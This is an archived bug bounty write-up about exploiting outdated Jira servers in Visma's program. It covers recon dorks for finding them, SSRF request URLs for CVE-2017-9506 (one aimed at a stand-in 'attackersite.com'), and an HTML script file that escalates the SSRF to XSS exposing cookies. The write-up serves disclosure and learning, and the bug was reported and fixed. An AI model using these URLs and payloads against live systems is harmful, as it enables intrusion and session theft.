---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-11-13_how-outdated-jira-instances-suffers-from-multiple-security-vulnerabilities.md
original_filename: 2018-11-13_how-outdated-jira-instances-suffers-from-multiple-security-vulnerabilities.md
title: How Outdated JIRA Instances suffers from multiple security vulnerabilities?
category: documents
detected_topics:
- oauth
- ssrf
- xss
- command-injection
- supply-chain
tags:
- imported
- documents
- oauth
- ssrf
- xss
- command-injection
- supply-chain
language: en
raw_sha256: 7b0f6b6f2f3cd4e713c66ac6f725e09d65485d776af20bf6aa0f0044ae27cb25
text_sha256: 453f54f08715a3b6762c443a58c6a247aeb6f9a53788bf1fefe83b8cc72b9b56
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# How Outdated JIRA Instances suffers from multiple security vulnerabilities?

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-11-13_how-outdated-jira-instances-suffers-from-multiple-security-vulnerabilities.md
- Source Type: markdown
- Detected Topics: oauth, ssrf, xss, command-injection, supply-chain
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `7b0f6b6f2f3cd4e713c66ac6f725e09d65485d776af20bf6aa0f0044ae27cb25`
- Text SHA256: `453f54f08715a3b6762c443a58c6a247aeb6f9a53788bf1fefe83b8cc72b9b56`


## Content

---
title: "How Outdated JIRA Instances suffers from multiple security vulnerabilities?"
url: "https://medium.com/@Skylinearafat/how-outdated-jira-instances-suffers-from-multiple-security-vulnerabilities-6a88c45e9ec6"
authors: ["Yeasir Arafat"]
programs: ["Visma"]
bugs: ["XSS", "SSRF"]
publication_date: "2018-11-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5610
scraped_via: "browseros"
---

# How Outdated JIRA Instances suffers from multiple security vulnerabilities?

How Outdated JIRA Instances suffers from multiple security vulnerabilities?
Yeasir Arafat
Follow
2 min read
·
Nov 4, 2018

219

5

1

Hello friends. This is Yeasir Arafat again here. In this article, I want to share what can we do with if a site is running third-party integration like jira.

I was testing a public bug bounty program called visma. As usual, I do the recon process to collect some subdomain of its. Few of its subdomains caught my attention which was running jira services. Example,

https://jira.visma.lv/secure/Dashboard.jspa
https://customer-incident.consulting.visma.com/secure/Dashboard.jspa

If you are particularly looking for jira subdomains of your targets you can use this kinda dorks.

inurl:companyname intitle:JIRA login
inurl:visma intitle:JIRA login
Press enter or click to view image in full size
recon

I noticed that the domain https://jira.visma.lv has the JIRA version 6.2.7. I remember a CVE-2017–9506 for the Jira versions < 7.3.5. From the later version of jira, we can perform an Unauthenticated SSRF (CVE-2017–9506).

https://site.com/jira/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.com
https://site/confluence/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.com

Loading external site as an Unauthenticated SSRF on https://jira.visma.lv.

https://jira.visma.lv/plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.com
Press enter or click to view image in full size
Unauthenticated SSRF

I have tried to extract some data to the internal assets or getting read access but I am unable to do that. For the exploitation, you can use a tools name `Jira-Scan` available in Github.

Get Yeasir Arafat’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

You can create a simple HTML file which means to add XSS script. By running the file onto the consumerUri=http://yoursite.com/xsshostedfile you can trigger the XSS.

<html>
<head>
<title>SSRF to XSS on Jira Vulnerable Instances</title>
</head>
<body>
  <script>
  alert( document.domain + " is vulnerable" );
  alert( document.cookie);
</script>
</body>
</html>

Turning into XSS by adding an HTML file. It also increases the severity of the vulnerability.

2. https://jira.visma.lv/plugins/servlet/oauth/users/icon-uri?consumerUri=http://attackersite.com/ssrf.html

Press enter or click to view image in full size
SSRF to XSS

I know that only loading external site is p4 severity bugs. Hopefully, I am able to turn this SSRF into XSS. The attacker can now steal the victim cookies.

p4

After sending a clean report about this vulnerability to the visma they fixed the issue between few hours. They told me that they will decommission other sub-domains which suffer from this same vulnerability.

Thanks!
- Yeasir Arafat
